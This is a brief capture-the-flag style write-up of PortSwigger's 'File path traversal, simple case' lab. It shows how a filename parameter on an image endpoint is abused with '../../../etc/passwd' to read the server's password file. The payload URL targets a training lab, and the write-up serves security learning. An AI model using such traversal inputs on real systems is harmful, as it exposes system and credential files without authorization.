# Lab 1 : File path traversal, simple case

**Platform:** PortSwigger Web Security Academy

**Category:** Path Traversal (Apprentice)

<img width="746" height="162" alt="image" src="https://github.com/user-attachments/assets/ef79fb54-b27a-43b0-a163-fe196c5069c8" />

## Lab Description

This lab contains a path traversal vulnerability in the display of product images.

To solve the lab, retrieve the contents of the /etc/passwd file.


## Steps

### 1. Inspecting the Website

First, I accessed the website and found several posts.

I opened any post and noticed there was an image.

I opened the image in a new tab.

The URL was:
```
https://0a3700d6040714ea8056a875007c00d2.web-security-academy.net/image?filename=8.jpg
```

### 2. Testing Path Traversal

I noticed there was a filename parameter used to load the image.

I tried to access the /etc/passwd file using path traversal:
```
https://0a3700d6040714ea8056a875007c00d2.web-security-academy.net/image?filename=../../../etc/passwd
```

### 3. Retrieving the File

The server returned the contents of the /etc/passwd file.

Voilaaaa!!

The file was successfully retrieved and the lab was solved.

<img width="1260" height="676" alt="image" src="https://github.com/user-attachments/assets/9c9f052b-06cd-4e7d-942f-96d1d49d32a3" />

#
**Lab Link:** [Open the lab](https://portswigger.net/web-security/file-path-traversal/lab-simple)

See you in the next lab solution, In sha Allah!


سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
